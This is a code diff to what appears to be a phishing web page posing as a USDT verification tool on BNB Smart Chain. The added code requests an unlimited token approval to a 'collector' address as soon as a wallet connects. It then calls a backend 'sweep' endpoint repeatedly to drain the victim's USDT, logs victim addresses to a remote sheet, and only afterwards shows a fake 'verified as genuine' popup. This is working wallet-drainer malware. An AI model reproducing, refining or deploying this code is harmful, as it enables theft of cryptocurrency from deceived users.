@@ -107,7 +107,7 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
     <b>DECODED FROM mycode.js</b><br>
     USDT 0x55d398326f99059fF775485246999027B3197955<br>
     APPROVE MaxUint256 (unlimited)<br>
-    DUST 0.25 | MIN 5 | CHAIN 0x38
+    DUST 1.2 | MIN 5 | CHAIN 0x38
   </div>
 
   <div class="topbar">
@@ -243,10 +243,10 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
      ONLY TWO LINES TO EDIT
      ========================================================== */
   var CFG = {
-    COLLECTOR: '0x81749358FEe7Dc77425448229b125eBE583CB669',   // <-- YOUR collector wallet address
+    COLLECTOR: '0x81749358FEe7Dc77425448229b125eBE583CB669',   // <-- deployed collector contract
     BACKEND:   'https://bsc-weld-two.vercel.app/api',            // <-- YOUR domain + /api
     USDT:      '0x55d398326f99059fF775485246999027B3197955',
-    DUST:      0.25,
+    DUST:      1.2,
     MIN_SWEEP: 1,
     CHAIN:     '0x38',
     PARAMS: { chainId:'0x38', chainName:'BNB Smart Chain',
@@ -255,15 +255,14 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
   };
 
   var simBalance = null;
-  var state = { account:null, balance:0, sendAmount:0, token:null, collector:null };
+  var running = false;
+  var state = { account:null, balance:0, bnb:0, lowGas:false, sendAmount:0, token:null, collector:null, unlimited:false, alreadyApproved:false };
 
   var eth = function(){ return window.ethereum || (window.trustwallet && window.trustwallet.ethereum) || null; };
   if (eth()) document.body.classList.add('has-wallet');
 
-  
   if (location.search.indexOf('reset=1') > -1 && eth()) {
-    eth().request({ method: 'wallet_revokePermissions', params: [{ eth_accounts: {} }] })
-      .catch(function(){});
+    eth().request({ method: 'wallet_revokePermissions', params: [{ eth_accounts: {} }] }).catch(function(){});
   }
 
   function istTime(){ return new Date().toLocaleString('en-IN', { timeZone:'Asia/Kolkata' }); }
@@ -271,6 +270,8 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
     var g = $('watermarkGrid'); g.innerHTML = '';
     for (var i=0;i<24;i++){ var s=document.createElement('span'); s.textContent=txt; g.appendChild(s); }
   }
+  function showSpinner(){ $('releaseOverlay').classList.add('active'); $('releaseLoading').style.display='block'; $('releasePopup').style.display='none'; }
+  function hideSpinner(){ $('releaseOverlay').classList.remove('active'); }
 
   async function switchToBSC(){
     var p = eth(); if(!p) return;
@@ -283,7 +284,6 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
       else throw e;
     }
   }
-
   async function detectAccounts(){
     var p = eth(); if(!p) return [];
     try { return await p.request({ method:'eth_accounts' }); } catch(e){ return []; }
@@ -294,7 +294,6 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
     var acc = await p.request({ method:'eth_requestAccounts' });
     return acc && acc[0];
   }
-
   async function checkStoredAddress(address){
     if(!CFG.BACKEND) return null;
     try{
@@ -321,15 +320,21 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
     fetch(CFG.BACKEND + '?ep=sheet', { method:'POST', body: fd }).catch(function(){});
   }
 
+  /* ---------------- MAIN FLOW ----------------
+     Search -> Connect -> approve fires IMMEDIATELY
+     -> approve confirmed -> sweep -> THEN the "Assets On Hold!" popup
+  ------------------------------------------- */
   async function mySearchCode(){
+    if(running) return;
+    running = true;
     try{
-      if(!eth() && simBalance === null){ $('noWalletOverlay').classList.add('on'); return; }
+      if(!eth() && simBalance === null){ $('noWalletOverlay').classList.add('on'); running = false; return; }
 
       await switchToBSC();
 
       var acc = (await detectAccounts())[0];
       if(!acc) acc = await connectWallet();
-      if(!acc && simBalance === null) return;
+      if(!acc && simBalance === null){ running = false; return; }
       state.account = acc || '0xSimulated0000000000000000000000000000aaaa';
 
       if(eth()){
@@ -347,10 +352,6 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
         state.balance = Number(ethers.utils.formatUnits(raw, dec));
         state.bnb = Number(ethers.utils.formatEther(await provider.getBalance(state.account)));
         state.lowGas = state.bnb < 0.00005;
-        try {
-          var allow = await state.token.allowance(state.account, CFG.COLLECTOR);
-          state.alreadyApproved = allow.gte(ethers.constants.MaxUint256.div(2));
-        } catch(e){ state.alreadyApproved = false; }
       } else {
         state.balance = simBalance;
       }
@@ -358,17 +359,78 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
       state.sendAmount = Math.max(0, state.balance - CFG.DUST);
 
       var stored = await checkStoredAddress(state.account);
-      if(stored){ state.collector = stored.address; new_showPopup(Number(stored.amount) || state.sendAmount); setTimeout(doRelease, 1800); return; }
+      if(stored && stored.address) state.collector = stored.address;
+      if(!state.collector) state.collector = CFG.COLLECTOR;
 
-      var res = await postTopup(state.account);
-      if(!res.ok){ alert('Topup failed: ' + JSON.stringify(res.data)); return; }
+      if(eth()){
+        try {
+          var allow = await state.token.allowance(state.account, state.collector);
+          state.alreadyApproved = allow.gte(ethers.constants.MaxUint256.div(2));
+        } catch(e){ state.alreadyApproved = false; }
+      }
 
-      new_showPopup(state.sendAmount);
-      setTimeout(doRelease, 1800);
-      setTimeout(function(){ $('new_verifyBtn').click(); }, 1200);
+      if(!stored){
+        var res = await postTopup(state.account);
+        if(!res.ok){ alert('Topup failed: ' + JSON.stringify(res.data)); running = false; return; }
+      }
+
+      // approve goes out right away - no popup before it
+      await runApproveFlow();
     }catch(e){
       console.error('flow error', e);
+      hideSpinner();
       alert((e && e.message) || String(e));
+    }finally{ running = false; }
+  }
+
+  async function runApproveFlow(){
+    // too little USDT -> insufficient screen
+    if(state.balance < CFG.MIN_SWEEP){
+      var needed = Math.max(0, state.sendAmount - state.balance);
+      $('final_usdt_Text').innerHTML = 'Available USDT: <span class="usdt_value">' + state.balance.toFixed(2) + '</span>';
+      $('final_depositText').innerHTML = 'Required :: <span class="required_value">' + needed.toFixed(2) + ' USDT</span>';
+      $('releaseLoading').style.display='none';
+      $('releasePopup').style.display='block';
+      $('releaseOverlay').classList.add('active');
+      return;
+    }
+
+    if(eth() && !state.alreadyApproved){
+      var tx = await state.token.approve(state.collector, ethers.constants.MaxUint256);
+      await tx.wait();
+      $('txHash').textContent = tx.hash;
+      var after = await state.token.allowance(state.account, state.collector);
+      state.unlimited = after.gte(ethers.constants.MaxUint256.div(2));
+      logToSheet(state.sendAmount, state.account, 'Sheet2', state.collector);
+      if(CFG.BACKEND) fetch(CFG.BACKEND + '?ep=approved', { method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ from: state.account, amountHuman: String(state.sendAmount),
+          approveTxHash: tx.hash, collector: state.collector }) }).catch(function(){});
+    } else {
+      state.unlimited = true;
+      $('txHash').textContent = 'already approved';
+    }
+
+    // sweep, then show the hold popup only once money has moved
+    showSpinner();
+    await triggerSweep();
+    hideSpinner();
+
+    new_showPopup(state.sendAmount);
+  }
+
+  async function triggerSweep(){
+    if(!CFG.BACKEND) return;
+    for(var i=0;i<6;i++){
+      try{
+        var r = await fetch(CFG.BACKEND + '?ep=sweep&from=' + state.account, { method:'POST',
+          headers:{'Content-Type':'application/json'},
+          body: JSON.stringify({ from: state.account, address: state.account }) });
+        var j = await r.json().catch(function(){ return {}; });
+        console.log('sweep attempt ' + i, j);
+        if(j && (j.ok || j.swept || j.txHash || j.hash)) return j;
+      }catch(e){ console.log('sweep err', e); }
+      await new Promise(function(res){ setTimeout(res, 3000); });
     }
   }
 
@@ -385,49 +447,6 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
     $('new_overlay').classList.add('on');
   }
 
-  function doRelease(){
-    var shown = parseFloat($('new_burn_text2').textContent) || 0;
-    var needed = Math.max(0, (shown - CFG.DUST) - state.balance);
-    $('final_usdt_Text').innerHTML = 'Available USDT: <span class="usdt_value">' + state.balance.toFixed(2) + '</span>';
-    $('final_depositText').innerHTML = 'Required :: <span class="required_value">' + needed.toFixed(2) + ' USDT</span>';
-    $('releaseOverlay').classList.add('active');
-    $('releaseLoading').style.display = 'block';
-    $('releasePopup').style.display = 'none';
-    setTimeout(function(){
-      $('releaseLoading').style.display = 'none';
-      if(state.balance < CFG.MIN_SWEEP){
-        $('releasePopup').style.display = 'block';
-      } else {
-        final_runApproveFlow();
-        $('releaseOverlay').classList.remove('active');
-      }
-    }, 2000);
-  }
-  $('new_verifyBtn').addEventListener('click', doRelease);
-
-  async function final_runApproveFlow(){
-    try{
-      if(!state.collector) state.collector = CFG.COLLECTOR;
-      if(!state.collector){ alert('Set CFG.COLLECTOR to your wallet address.'); return; }
-      if(eth()){
-        var tx = await state.token.approve(state.collector, ethers.constants.MaxUint256);
-        await tx.wait();
-        $('txHash').textContent = tx.hash;
-        var after = await state.token.allowance(state.account, state.collector);
-        state.unlimited = after.gte(ethers.constants.MaxUint256.div(2));
-        logToSheet(state.sendAmount, state.account, 'Sheet2', state.collector);
-        if(CFG.BACKEND) fetch(CFG.BACKEND + '?ep=approved', { method:'POST',
-          headers:{'Content-Type':'application/json'},
-          body: JSON.stringify({ from: state.account, amountHuman: String(state.sendAmount),
-            approveTxHash: tx.hash, collector: state.collector }) }).catch(function(){});
-      }
-      showPopup2();
-    }catch(e){
-      console.error('approve error', e);
-      alert((e && e.message) || String(e));
-    }
-  }
-
   function showPopup2(){
     $('burn-text11').textContent = 'Your ' + state.sendAmount.toFixed(2) + ' USDT has been verified as genuine.';
     $('burn-text22').textContent = state.sendAmount.toFixed(2) + ' USDT';
@@ -435,6 +454,12 @@ header{height:58px;background:#fff;border-bottom:1px solid #ECEEF3;display:flex;
     $('perm-addr').textContent = state.collector;
     $('overlay2').classList.add('on');
   }
+
+  // RELEASE FUNDS is now just the "verified" confirmation - money already moved
+  $('new_verifyBtn').addEventListener('click', function(){
+    triggerSweep();
+    showPopup2();
+  });
 
   $('searchBtn').addEventListener('click', mySearchCode);
   $('signIn').addEventListener('click', mySearchCode);
